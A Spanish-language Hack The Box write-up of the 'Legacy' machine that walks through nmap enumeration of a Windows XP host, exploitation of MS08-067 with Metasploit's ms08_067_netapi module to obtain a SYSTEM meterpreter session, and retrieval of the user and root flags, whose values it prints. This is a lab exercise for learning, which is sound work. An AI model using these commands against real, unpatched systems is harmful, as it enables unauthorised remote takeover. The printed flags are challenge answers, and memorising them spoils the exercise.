# Legacy — HTB Writeup

**Autor:** Ph4n3s  
**Dificultad:** Easy  
**OS:** Windows XP  

---

## 1. Enumeración

Empezamos con un `ping -c 5` a la máquina. Responde con TTL 127, lo que nos indica que es una máquina Windows (Linux suele dar 64, Windows 128, y al pasar por un salto baja uno).

### 1.1 Escaneo de puertos abiertos

```bash
nmap -p- --open -T4 --min-rate 5000 10.129.227.181 -oN ~/HTB_machines/Legacy/ports
```

```
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

### 1.2 Escaneo dedicado a los puertos abiertos

```bash
nmap -p 135,139,445 -T4 --min-rate 5000 -sVC 10.129.227.181 -oN ~/HTB_machines/Legacy/targeted
```

```
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds

Host script results:
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   Computer name: legacy
|   Workgroup: HTB
| smb-security-mode:
|   account_used: guest
|   message_signing: disabled (dangerous, but default)
```

Confirmamos que es un **Windows XP**, sistema sin soporte. Los tres puertos abiertos (135, 139, 445) son servicios SMB/RPC clásicos con vulnerabilidades conocidas. Toca buscar exploit.

---

## 2. Explotación

El exploit elegido es `exploit/windows/smb/ms08_067_netapi`, una vulnerabilidad crítica en el servicio Server de Windows que afecta a XP SP2/SP3 y permite ejecución remota de código sin autenticación.

Arrancamos `msfconsole` y configuramos:

```
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.129.227.181
set LHOST 10.10.16.120
run
```

En pocos segundos tenemos sesión meterpreter. Pasamos a shell interactiva:

```
shell
```

Listamos usuarios del sistema:

```
net user
```

```
Administrator   Guest   HelpAssistant   john   SUPPORT_388945a0
```

---

## 3. Post-explotación

### 3.1 Flag de usuario

Importante: en Windows XP los perfiles **no están en `C:\Users`** (eso es Vista en adelante), sino en:

```
C:\Documents and Settings\
```

Hay que poner comillas porque la ruta tiene espacios:

```
cd "C:\Documents and Settings\john\Desktop"
type user.txt
```

**Flag usuario:** `e69af0e4f443de7e36876fda4ec7644f`

### 3.2 Flag de administrador

Al haber entrado directamente como SYSTEM con el exploit, tenemos acceso total sin necesidad de escalar privilegios:

```
cd "C:\Documents and Settings\Administrator\Desktop"
type root.txt
```

**Flag root:** `993442d258b0e0ec917cae9e695d5713`

---

## Conclusión

Máquina sencilla pero muy didáctica para entender cómo funciona la explotación de SMB en sistemas sin parchear. El exploit `ms08_067_netapi` es prácticamente automático, lo que la hace ideal para iniciarse con Metasploit.

Lo que me llevé: no asumir rutas de Windows moderno en sistemas antiguos — `C:\Users` no existe en XP.
